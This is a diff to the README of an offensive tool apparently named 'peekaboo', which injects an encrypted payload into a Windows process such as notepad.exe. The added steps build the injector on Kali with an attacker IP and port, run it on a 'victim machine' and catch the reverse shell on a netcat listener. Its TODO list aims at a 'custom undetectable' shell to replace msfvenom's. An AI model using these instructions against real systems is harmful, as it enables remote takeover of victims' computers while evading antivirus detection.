@@ -77,6 +77,24 @@ check your netcat listener:
 
 ![check netcat listener](./screenshots/10.png?raw=true)
 
+## 3. UPDATTE: Compile injector on kali linux (but only console .exe now)
+run python script on linux (for example process `notepad.exe`):
+```bash
+python3 peekaboo-inj.py -l 10.10.88.57 -p 4444 -e notepad.exe
+```
+
+![encrypting and compile](./screenshots/12.png?raw=true)
+
+### then on victim machine (windows 10 x64):
+```cmd
+.\peekaboo.exe
+```
+
+### check on attacker machine:
+check your netcat listener:
+
+![check netcat listener](./screenshots/13.png?raw=true)
+
 ## Issues.
 Tested on:
 1. Attacker machines: Kali linux 2020.1, Windows 10 x64
@@ -89,9 +107,11 @@ Tested on:
 
 ![virustotal](./screenshots/11.png?raw=true)
 
+[https://www.virustotal.com/gui/file/c930b9aeab693d36c68e7bcf6353c7515b8fffc8f9a9233e49e90da49ab5d470/detection](https://www.virustotal.com/gui/file/c930b9aeab693d36c68e7bcf6353c7515b8fffc8f9a9233e49e90da49ab5d470/detection)
+
 ## TODO
-- [ ] Compile injector in Kali linux
-- [ ] Implement custom variations of `GetProcAddress` and `GetModuleHandle` functions 
+- [x] Compile injector in Kali linux
+- [ ] Implement custom variations of `GetProcAddress` and `GetModuleHandle` functions
 - [ ] Replace msfvenom shell to custom undetectable
 
 ## Attention
